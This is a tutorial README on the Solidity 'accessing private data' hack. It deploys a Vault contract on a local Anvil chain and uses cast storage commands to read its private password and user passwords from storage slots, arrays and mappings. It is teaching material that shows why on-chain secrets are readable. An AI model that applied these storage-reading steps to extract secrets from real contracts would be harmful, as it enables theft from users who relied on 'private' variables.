## Accessing Private Data Hack
https://solidity-by-example.org/hacks/accessing-private-data/

Demonstrates  that we can read private data in the blockchain and how Solidity stores state variables.

Folder accessingPrivateDataHack 

Run anvil:

```bash
anvil
```

Deploy the Vault contract to Anvil

```bash
forge create src/accessingPrivateDataHack/Vault.sol:Vault\
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast \
  --constructor-args $(cast --to-bytes32 $(cast --from-utf8 "mypassword")) 

  # Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```
Let's start reading the storage slots:

```bash
# Slot 0 - count
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0
# 0x000000000000000000000000000000000000000000000000000000000000007b
# To verify it's correct we run:
cast --to-dec 0x000000000000000000000000000000000000000000000000000000000000007b
# 123

# Slot 1 - u16, isTrue, owner
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 1
# 0x000000000000000000001f01f39fd6e51aad88f6f4ce6ab8827279cfffb92266
# To verify it's correct we do:
#     1. Extract the address (last 20 bytes / 40 hex chars):
#        0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
#     2. Extract the bool (1 byte before the address):
#        0x01 (true)
#     3. Extract the uint16 (2 bytes before the bool):
#        0x001f (31, veridy with cast --to-dec 0x001f)

# Slot 2 - password
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 2
# 0x6d7970617373776f726400000000000000000000000000000000000000000000
# To verify it let's run:
cast --to-utf8 0x6d7970617373776f726400000000000000000000000000000000000000000000
# mypassword

# Slot 6 - array length
# Let's calulate the storage slot for the first element of the users array.
# We can do it in 2 ways:
#     1. We can call the function getArrayLocation(6, 0, 2)
        cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getArrayLocation(uint256,uint256,uint256)" 6 0 2 
#       0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f
#     2. Calculate keccak256 manually. Since the index is 0 we can calulate it this way: 
        cast keccak $(cast abi-encode "f(uint256)" 6)
#       0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f

# Now we can read the array length:
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 6
# 0x0000000000000000000000000000000000000000000000000000000000000000
# It returns zero because we haven't added users yet.

# Add 1st user
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "addUser(bytes32)" $(cast --to-bytes32 $(cast --from-utf8 "1password")) \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

# Let's check again the array length:
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 6
# 0x0000000000000000000000000000000000000000000000000000000000000001
# It returns 1 because we have added 1 element

# Let's check the id of the first user. Id is at: getArrayLocation(6, 0, 2)
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f  
# 0x0000000000000000000000000000000000000000000000000000000000000000
# It's zero and it's correct

# Let's check the password for the first user. Password is at: getArrayLocation(6, 0, 2) + 1
# First slot (id):       0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f
#                                                                                        ^^
# Add 1:                                                                         3f + 1 = 40
#                                                                                    
# Second slot (password): 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40
# 0x3170617373776f72640000000000000000000000000000000000000000000000
cast --to-utf8 0x3170617373776f72640000000000000000000000000000000000000000000000
# 1password


# Add 2st user
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "addUser(bytes32)" $(cast --to-bytes32 $(cast --from-utf8 "2password")) \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

# Let's check again the array length:
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 6
# 0x0000000000000000000000000000000000000000000000000000000000000002
# It returns 2 because we have added 2 elements  

# Let's check the location of the 2nd user
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getArrayLocation(uint256,uint256,uint256)" 6 1 2 
# 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41  
# 0x0000000000000000000000000000000000000000000000000000000000000001

# Let's check the password of the second user
# Password is at the next slot: 0x...0d41 + 1 = 0x...0d42
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42
# 0x3270617373776f72640000000000000000000000000000000000000000000000
cast --to-utf8 0x3270617373776f72640000000000000000000000000000000000000000000000
# 2password


# slot 7 - empty
# User 0
# Let's call getMapLocation(7, 0)
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getMapLocation(uint256,uint256)" 7 0 
# 0x6d5257204ebe7d88fd91ae87941cb2dd9d8062b64ae5a2bd2d28ec40b9fbf6df
# User id (first field of struct)
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0x6d5257204ebe7d88fd91ae87941cb2dd9d8062b64ae5a2bd2d28ec40b9fbf6df
# Should return: 0x0000...0000 (id = 0)

# User Password is at the next slot (df + 1 = e0):
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0x6d5257204ebe7d88fd91ae87941cb2dd9d8062b64ae5a2bd2d28ec40b9fbf6e0
# 0x3170617373776f72640000000000000000000000000000000000000000000000

# Decode the password:
cast --to-utf8 0x3170617373776f72640000000000000000000000000000000000000000000000
# Should show: 1password

# User 1
# Let's call getMapLocation(7, 1)
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getMapLocation(uint256,uint256)" 7 1 
# 0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828

# User id (first field of struct)
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828
# 0x0000000000000000000000000000000000000000000000000000000000000001 (id=1)

# User password (second field - next slot: b828 + 1 = b829)
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829
# 0x3270617373776f72640000000000000000000000000000000000000000000000

# Decode the password:
cast --to-utf8 0x3270617373776f72640000000000000000000000000000000000000000000000
# Should show: 2password

```